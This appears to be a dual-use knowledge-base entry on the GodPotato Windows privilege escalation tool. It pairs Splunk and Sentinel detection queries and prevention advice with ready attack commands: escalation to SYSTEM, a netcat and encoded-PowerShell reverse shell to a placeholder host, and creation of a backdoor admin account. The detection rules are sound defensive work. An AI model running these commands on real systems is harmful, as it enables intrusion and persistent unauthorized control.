name: GodPotato - Universal Windows Potato Privilege Escalation
description: GodPotato works on Windows Server 2012-2022 and Windows 8-11 by exploiting DCOM/RPCSS to escalate from service accounts with SeImpersonatePrivilege to SYSTEM. Unlike older potatoes, it does not rely on specific Windows versions or BITS/PrintSpooler. The most reliable current potato for modern Windows.
notes:
=== WHEN TO USE ===
You have a shell as a service account with SeImpersonatePrivilege:
  whoami /priv
  # Look for: SeImpersonatePrivilege - Enabled
  # Common accounts: IIS AppPool, MSSQL, service accounts

=== BASIC USAGE ===
  GodPotato.exe -cmd "cmd /c whoami"
  # Output: nt authority\system

=== REVERSE SHELL ===
  GodPotato.exe -cmd "cmd /c powershell -e <base64_payload>"
  # Or:
  GodPotato.exe -cmd "cmd /c C:\temp\nc.exe <ip> <port> -e cmd.exe"

=== ADD ADMIN USER ===
  GodPotato.exe -cmd "net user hacker Password123! /add"
  GodPotato.exe -cmd "net localgroup administrators hacker /add"

=== POTATO FAMILY ===
- GodPotato: Works on all modern Windows (2012-2022, 8-11)
- PrintSpoofer: Uses print spooler (may be disabled)
- JuicyPotato: Windows Server 2016/2019 (needs CLSID)
- SweetPotato: Combines multiple techniques
- RoguePotato: Needs outbound TCP
- All require SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

recommended.note: PrintSpoofer alternative when print spooler is running.
JuicyPotato for older Windows Server versions.

defense.why_it_works: GodPotato abuses DCOM/RPCSS to negotiate authentication and impersonate SYSTEM. The SeImpersonatePrivilege token allows the service account to assume any token presented to it.
defense.prerequisites: Service account with SeImpersonatePrivilege; GodPotato binary on target.
defense.impact: SYSTEM-level code execution from a service account.
defense.detection: [MITRE T1134.001] GodPotato process creation; token manipulation events; new process spawned as SYSTEM from service context.
defense.artifacts: GodPotato.exe on disk; process creation under service account spawning SYSTEM child; Event 4688 with token elevation.
defense.splunk_spl:
index=windows EventCode=4688 (NewProcessName="*GodPotato*" OR NewProcessName="*potato*")
| table _time, SubjectUserName, NewProcessName, CommandLine
defense.sentinel_kql:
DeviceProcessEvents
| where FileName has_any ("GodPotato", "SweetPotato", "JuicyPotato")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
defense.prevention: Remove SeImpersonatePrivilege from unnecessary service accounts; use Group Managed Service Accounts; monitor for potato tool signatures.

detections.name: Potato privilege escalation tool execution
detections.logic:
DeviceProcessEvents
| where FileName has_any ("GodPotato", "SweetPotato", "JuicyPotato", "RoguePotato", "PrintSpoofer")
  or ProcessCommandLine has_any ("GodPotato", "-cmd", "SweetPotato")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
detections.false_positives: Renamed binaries will evade filename-based detection
detections.tuning: Also monitor for SeImpersonatePrivilege abuse patterns and unexpected SYSTEM child processes from service accounts
